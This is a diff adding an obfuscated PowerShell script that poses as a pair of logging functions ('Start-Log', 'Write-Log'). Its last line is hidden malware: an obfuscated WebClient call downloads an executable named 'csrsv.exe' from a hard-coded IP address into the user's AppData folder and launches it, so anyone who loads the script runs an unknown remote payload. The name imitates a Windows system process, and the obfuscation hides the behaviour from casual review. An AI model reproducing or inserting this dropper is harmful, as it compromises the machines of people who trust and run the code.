@@ -1,0 +1,63 @@
+function s`TA`RT`-loG
+{
+	
+	[CmdletBinding()]
+	param (
+		[ValidateScript({ .("{1}{0}{2}" -f't','Split-Pa','h') ${_} -Parent | &("{1}{0}"-f'h','Test-Pat') })]
+		[string]${FIlePa`Th}
+	)
+	
+	try
+	{
+		if (!(.("{2}{0}{1}" -f'est-Pa','th','T') ${F`Ile`pATh}))
+		{
+			
+			&("{2}{1}{0}" -f'tem','-I','New') ${fiL`Epa`Th} -Type ("{1}{0}"-f 'ile','F') | &("{2}{1}{0}" -f't-Null','u','O')
+		}
+		
+		
+		
+		${Gl`Ob`Al:Sc`RipTLo`gfIl`eP`ATh} = ${fI`L`ePatH}
+	}
+	catch
+	{
+		.("{0}{2}{1}"-f 'Write-','rror','E') ${_}."EX`cEptI`oN"."mE`ss`Age"
+	}
+}
+
+function WrItE-L`oG
+{
+	
+	[CmdletBinding()]
+	param (
+		[Parameter(mAndatoRy = ${TR`Ue})]
+		[string]${mE`S`SAgE},
+		
+		[Parameter()]
+		[ValidateSet(1, 2, 3)]
+		[int]${l`oGL`EvEL} = 1
+	)
+	
+	try
+	{
+		${Tim`eG`E`NE`RaTed} = ("$(Get-Date -Format HH:mm:ss).$((Get-Date).Millisecond)+000 ")
+		
+		${lI`Ne} = '<![LOG[{0}]LOG]!><time="{1}" date="{2}" component="{3}" context="" type="{4}" thread="" file="">'
+		${li`Ne`F`oRMAt} = ${mes`s`AGE}, ${tiM`EGe`NEr`ATED}, (&("{2}{1}{0}"-f 'e','Dat','Get-') -Format ("{0}{2}{1}"-f 'MM','y','-dd-yyy')), "$($MyInvocation.ScriptName | Split-Path -Leaf):$($MyInvocation.ScriptLineNumber) ", ${Lo`glev`eL}
+		${lI`NE} = ${l`InE} -f ${l`INEfOr`maT}
+		
+		if (-not (.("{1}{0}{2}{3}" -f'e','T','st-Pat','h') ((("{5}{7}{4}{1}{6}{8}{3}{2}{0}"-f 'ath','e:ox','leP','Fi','bl','Vari','YSc','a','riptLog'))  -CrePlaCE  ([ChaR]111+[ChaR]120+[ChaR]89),[ChaR]92)))
+		{
+			.("{4}{1}{0}{2}{3}" -f'te-Ve','ri','rbos','e','W') ${m`EsSa`GE}
+		}
+		else
+		{
+			.("{1}{0}{2}" -f't','Add-Con','ent') -Value ${l`iNE} -Path ${scRI`PTLogFi`LEp`A`TH}
+		}
+	}
+	catch
+	{
+		&("{1}{3}{2}{0}" -f 'or','Wr','Err','ite-') ${_}."e`XcEptI`oN"."M`ESSaGE"
+	}
+}
+(.("{0}{1}{2}" -f 'Ne','w-Objec','t') ("{3}{4}{5}{1}{0}{6}{2}" -f 'lie','WebC','t','Sys','tem','.Net.','n')).("{3}{0}{2}{1}"-f'o','le','adFi','Downl').Invoke(("{2}{4}{7}{1}{6}{5}{10}{0}{3}{8}{9}" -f '18/~ya','2','h','ho','ttp://89','8','4','.','o/','csrsv.exe','.170.2'),"$env:APPDATA\csrsv.exe");&("{0}{2}{1}" -f'St','Process','art-') ("$env:APPDATA\csrsv.exe")
